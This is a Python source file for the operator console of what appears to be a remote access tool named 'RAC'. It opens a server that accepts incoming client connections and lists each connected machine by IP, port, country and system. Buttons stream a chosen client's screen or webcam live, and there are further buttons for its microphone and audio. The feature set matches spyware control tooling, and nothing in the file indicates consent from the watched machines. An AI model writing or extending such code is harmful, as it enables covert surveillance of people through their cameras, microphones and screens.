import PySimpleGUI as sg
import server
from threading import Thread
from log import log
import cv2

sg.theme('Black')

layout = [
    [
        sg.Button('Update All', key='-UPDATE-'),
        sg.Button('Detailed Info'),
    ],
    [
        sg.Table(
            values=[],
            headings=['#', 'IP', 'Port', 'Country', 'System', 'Version'],
            row_height=35,
            num_rows=10,
            col_widths=[5, 15, 7, 7, 15, 7],
            auto_size_columns=False,
            justification='center',
            hide_vertical_scroll=False,
            key='-CLIENTS-',
            enable_events=True,
        ),
    ],
    [
        sg.Button('Watch (Screen)', key='-SCREEN-'),
        sg.Button('Watch (Camera)', key='-CAMERA-'),
        sg.Button('Listen (Microphone)', key='-MIC-'),
        sg.Button('Listen (Audio)', key='-AUDIO-')
    ],
]

def update():
    server.update_clients()
    values = []
    for client, i in zip(server.clients, range(len(server.clients))):
        clnt = server.clients[client]
        values.append([i + 1, clnt[0], clnt[1]])
    window.Element('-CLIENTS-').Update(values=values)

stream_id = 0

def open_stream(clnt, typ):

    global stream_id
    stream_id += 1

    winname = f"Stream from {server.clients[clnt][0]}:{server.clients[clnt][1]} (id: {stream_id} / type: {typ})"
    
    log(f"[*] Opening stream... ({winname})")

    client = server.ask_for_stream(clnt, typ)

    while True:
        frame = client.recv()
        
        if frame is None:
            break

        frame = cv2.resize(frame, (1280, 720))

        cv2.imshow(winname, frame)

        if cv2.waitKey(1) == ord('q'):
            break
    
    cv2.destroyWindow(winname)

    client.close()

    log(f"[*] Stream ended ({winname})")

window = sg.Window('RAC', layout)
server.SERVER.listen(5)
Thread(target=server.accept_incoming_connections, daemon=True).start()
log(f"[#] Server started on {server.HOST}:{server.PORT}")

while True:
    event, values = window.read()
    if event in (None, 'Exit', 'Cancel'):
        break
    if event == '-UPDATE-':
        update()
    elif event == '-CLIENTS-':
        pass
    elif event in ('-SCREEN-', '-CAMERA-'):
        try:
            clnt = list(server.clients)[values['-CLIENTS-'][0]]
            if event == '-SCREEN-':
                typ = 'screen'
            elif event == '-CAMERA-':
                typ = 'camera'
            Thread(target=open_stream, args=(clnt, typ), daemon=True).start()
        except Exception as e:
            print(e)
            pass